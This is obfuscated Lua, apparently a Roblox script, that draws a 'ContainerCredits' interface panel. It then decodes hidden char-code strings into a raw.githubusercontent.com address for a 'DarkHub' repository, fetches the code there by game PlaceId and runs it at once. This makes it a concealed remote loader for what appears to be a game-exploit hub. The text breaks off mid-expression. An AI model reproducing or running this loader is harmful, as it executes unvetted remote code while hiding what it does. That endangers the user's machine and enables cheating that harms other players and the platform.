uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.Image=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="D433FE75515FD1D2539C54C71E81EB9BC7997912D0B0FCB7DDBCA153410428D057605A401ACC0B320A400FA3186E147A1DB9"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+14 end)(),98 ,120 ,97 ,115 ,115 ,101 ,116 ,105 ,100 ,58 ,47 ,47 ,50 ,57 ,55 ,55 ,55 ,52 ,51 ,55 ,49 )..""uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.ImageColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(15 ,15 ,15 )uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.ImageTransparency=1.000  uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.SliceCenter=UwuowOOwOuwUOwouwuuWUUWUOwOuwUOWOOWoUwUuwUUwuOwOOwOUWuOwOUwuOwO.new(20 ,20 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="B148D4A86CC78E1172AC0801D6301807BF96566259A33CD105219C30691602432B91075CBECF53F23BAF2BEDCFD255A199D9"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+180 end)(),280 )OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,111 ,110 ,116 ,97 ,105 ,110 ,101 ,114 ,67 ,114 ,101 ,100 ,105 ,116 ,115 )..""OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.Parent=UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="CA79B4E2E2576862724DCFFB1C69D43BD"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),33 ,33 )OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.BackgroundTransparency=1.000  OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.0327774696 ,0 ,0.367913216 ,0 )OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,179 ,0 ,107 )UwUowOUwUuwUuwUOWoUwUuwUOwoowouwuOwOUwUOwOOwouwUOwoOWOUwuowOOwO.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )UwUowOUwUuwUuwUOWoUwUuwUOwoowouwuOwOUwUOwOOwouwUOwoOWOUwuowOOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={925,64,96,633,960}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+62,111 ,110 ,116 ,97 ,105 ,110 ,101 ,114 ,67 ,114 ,101 ,100 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={48,404,212,520,997}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+100,116 ,115 ,85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 )..""UwUowOUwUuwUuwUOWoUwUuwUOwoowouwuOwOUwUOwOOwouwUOwoOWOUwuowOOwO.Parent=OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,114 ,101 ,100 ,105 ,116 ,115 ,84 ,101 ,120 ,116 )..""OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Parent=OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.BackgroundTransparency=1.000  OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.49825418 ,0 ,0.633732855 ,-15 )OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,165 ,0 ,88 )OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.Text=OwOUwuOwOUwuowOOWOUwUUwUOwOUwUOwoUWUUWuUWuUwuUwUUwUUwUUwUUwUOWo OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(168 ,168 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="EF59FDEC8D95DDB5BEA0463706BCC73BFBD213E3D1FAEE0E9F98E1CAB68919602604622C265E80063DE507A7BAE5EC229E52"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+68 end)())OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.TextSize=15.000  OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.TextTransparency=1.000  OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.TextWrapped=true  for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,OwoowOuWUUwUUwUUwuuWUUWuUwUUwUUwuuwUOWOUWuUwUuWuOwOUwuOwOUwuUwu do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{TextTransparency=0 }):Play()end for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,OwOuwUowOUwUoWOUwUOwOUwUUwUUwuOwOOwOOwOOWoUWUowOOwOuWuuwuuwUuwU do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{BackgroundTransparency=0 }):Play()end for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,UwUOwOUwuUWuowOUWUOwOOwoowOUwUuwUuwUuwUUwUuwUOwOOwoOwOuwUUwuowO do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{ImageTransparency=0.3 }):Play()end uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO:TweenSize(OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,393 ,0 ,191 ),OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quart,.2 ,true )uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.MouseEnter:Connect(function()OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(45 ,45 ,45 )}):Play()end)uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.MouseLeave:Connect(function()OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(39 ,39 ,39 )}):Play()end)uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU.MouseButton1Click:Connect(function()for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,OwoowOuWUUwUUwUUwuuWUUWuUwUUwUUwuuwUOWOUWuUwUuWuOwOUwuOwOUwuUwu do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{TextTransparency=1 }):Play()end for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,OwOuwUowOUwUoWOUwUOwOUwUUwUUwuOwOOwOOwOOWoUWUowOOwOuWuuwuuwUuwU do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{BackgroundTransparency=1 }):Play()end for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in OwOowOUwUoWOOwoOwouwuuwUOwOOwOUWuowoowOUwUOwoUWUOwOUwUOwOowOUwU,UwUOwOUwuUWuowOUWUOwOOwoowOUwUuwUuwUuwUUwUuwUOwOOwoOwOuwUUwuowO do OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU:Create(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwUOWouWuUwUOwoOwouwUuwuOwOOwOuwUOwOUwUowOUwuOwOOWoUwuuwUUwU.new(.3 ,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quad,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out),{ImageTransparency=1 }):Play()end uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO:TweenSize(OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,0 ,0 ,0 ),OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingDirection.Out,OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.EasingStyle.Quart,.2 ,true )uWUUwuowoOwOOwOuwUOwOuwUOwouwuUwUOwOOwOUWuOwOOwOowOUwUUwuuWuuwU(.5 )OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo:Destroy()if UwUOwOuWuOwOuWUOwOUWuuwUoWOuwUUwuOwOowOowoOwOUWuoWoUwUuwUOwOowO()then for UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo in uwUOwOUwUuwuOwOOwOOwOOwOUwUOwOowOOwOOwoOwOoWoOwOOwoOwoOWOuwuOwO(owOUwUuWuuwUUwUOwoUwuUwUOwoOWOOwoUwuUwUOwouWuUwUUwuOwOOwoUWuOwO)do if OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo==UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU.PlaceId then UWUOwOOWoUwuUWUUwUOwOUwUUwUuwUOwoOwOOwoUWUUwUuwUOwOowOUwUuwuUwu(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:HttpGet(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(104 ,116 ,116 ,112 ,115 ,58 ,47 ,47 ,114 ,97 ,119 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="9DC6C06E3A957E48606EF05313470610EB192821766212"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),103 ,105 ,116 ,104 ,117 ,98 ,117 ,115 ,101 ,114 ,99 ,111 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="3E3926BAD590F734C86DBC66F371FB882120C153803901BCFBE5C45906A4247F6F1AA8DE9DBEBB9BC09D6FD55928A7FECC9D"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+10 end)(),116 ,101 ,110 ,116 ,46 ,99 ,111 ,109 ,47 ,82 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={247,41,957,181,771}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+92,110 ,100 ,111 ,109 ,65 ,100 ,97 ,109 ,89 ,84 ,47 ,68 ,97 ,114 ,107 ,72 ,117 ,98 ,47 ,109 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="9E027369BD038D41281C927B7A8D1E4DAFB8A728D07B51F07CD220072A4E7D58A87A305913C527AECEC55AA57345EA8AC"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),115 ,116 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={770,434,464,853,215}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+96,114 ,47 )..''..UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,true ))()return end end else UWUOwOOWoUwuUWUUwUOwOUwUUwUuwUOwoOwOOwoUWUUwUuwUOwOowOUwUuwuUwu(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:HttpGet(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="B4A907B9042CFA8364D25917F71644E1DABB8553D044253BC326C05781D6B394453348044783CFA084BC7A8EDD29ACE0417D"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+4 end)(),116  ,116  ,112  ,115  ,58  ,47  ,47  ,114  ,97  ,119  ,46  ,103  ,105  ,116  ,104  ,117  ,98  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={850 ,584 ,238 ,148 ,97 }return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+112 ,115  ,101  ,114  ,99  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={459 ,971 ,790 ,926 ,54 }return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+106 ,110  ,116  ,101  ,110  ,116  ,46  ,99  ,111  ,109  ,47  ,82  ,97  ,110  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="8CD06C7FFD4D6D9588F6F2EAAA6DBD5C507ACED881B6768975D7F307F597EC0419160EE13FBC077F1C44905D411087E52014"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),111  ,109  ,65  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={333,655,993,206,473}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+95,97  ,109  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="8430CA865DC2ABE2D56410E1D46A1813012E193C96D1F339E54452EAC6B7FBBAC35E513F116C8FF9805481F1E"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),84  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={346,934,441,435,490}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+42,68  ,97  ,114  ,107  ,72  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={748 ,948 ,77 ,182 ,459 }return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+112 ,98  ,47  ,109  ,97  ,115  ,116  ,101  ,114  ,47  ,85  ,110  ,105  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={553,887,209,342,119}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+113,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(55 ,56 ,(function()local 